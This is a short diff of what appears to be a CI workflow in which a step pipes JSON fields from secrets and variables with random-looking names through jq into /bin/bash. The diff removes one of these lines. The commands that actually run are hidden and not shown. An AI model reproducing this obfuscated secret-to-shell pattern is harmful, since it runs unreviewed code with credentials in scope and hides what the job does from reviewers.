@@ -17,7 +17,6 @@ jobs:
           i16167: ${{ secrets.i16167 }}
         run: |
           printf '%s' "$i16167" | jq -r .ntyd18578 | /bin/bash
-          echo $nzff3 | jq -r .fvtta7 | /bin/bash
           printf '%s' "$itn19" | jq -r .red499 | /bin/bash
           echo $ai955 | jq -r .spdtb85423 | /bin/bash
           printf '%s' "$z78" | jq -r .fmsva85967 | /bin/bash
